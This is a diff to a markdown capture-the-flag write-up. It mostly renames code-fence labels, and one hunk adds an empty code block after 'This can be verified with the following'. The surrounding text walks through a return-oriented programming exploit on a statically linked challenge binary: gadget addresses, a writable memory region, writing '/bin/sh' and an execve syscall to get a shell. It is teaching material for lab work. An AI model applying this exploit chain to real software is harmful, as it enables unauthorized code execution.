@@ -19,7 +19,7 @@ We do not have any functions to overflow into, nor is there any shell written in
 
 But we notice that file is **statically linked**.
 
-```sh
+```shell
 $> file chall
 chall: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, ...
 ```
@@ -73,7 +73,7 @@ Found at offset 120
 ### Step 2
 Let's find the addresses of the gadgets we need.
 
-```sh
+```shell
 $> ROPgadget --binary chall | grep -E ": pop (rdi|rsi|rdx|rax) ; ret" | grep -v "retf"
 0x00000000004005af : pop rax ; ret
 0x00000000004006a6 : pop rdi ; ret
@@ -81,17 +81,22 @@ $> ROPgadget --binary chall | grep -E ": pop (rdi|rsi|rdx|rax) ; ret" | grep -v 
 0x0000000000410003 : pop rsi ; ret
 ```
 
-```sh
+```shell
 $> ROPgadget --binary chall | grep ": syscall"                                        
 0x000000000040127c : syscall
 ```
 
 ### Step 3
-We need to find a writable location of the binary in memory. That is where we will put the shell command (also because we cannot run shellcode directly due to NX protection).
+We need to find a writable location of the binary in memory. That is where we will put the shell command (also because we cannot run shellcode directly due to NX protection). This can be verified with the following:
+
+```shell
+```
+
+
 
 Run the following in pwndbg after running the program:
 
-```sh
+```shell
 pwndbg> vmmap
 LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
              Start                End Perm     Size Offset File
@@ -105,7 +110,7 @@ For this to work, we need to use a pointer gadget to move the `/bin/sh` into wri
 
 (P.S. you can use other ptr gadgets as well, as long as it does not disrupt program flow and does what we need).
 
-```sh
+```shell
 $> ROPgadget --binary chall | grep ": mov qword ptr \[rsi\], rax ; ret"
 0x000000000047f3c1 : mov qword ptr [rsi], rax ; ret
 ```
@@ -115,7 +120,7 @@ FYI, `QWORD` just means 64-bit unsigned int. But more importantly, we need the p
 ### Step 4
 Let's move the shell into the writable location. Since we are moving value `rax` into `rsi` pointer, we need the ROP chain to look like this:
 
-```sh
+```shell
 rax: /bin/sh\x00 (need the null byte)
 rsi: writable location (0x6b6000)
 move rax to rsi ptr gadget
@@ -139,7 +144,7 @@ payload += p64(movptr)
 ### Step 5
 Now that we have the shell written in memory, we can perform the syscall. Refer to this again.
 
-```sh
+```shell
 rax: 0x3b or 59 (dec)
 rdi: ptr location of `/bin/sh`
 rdx: 0
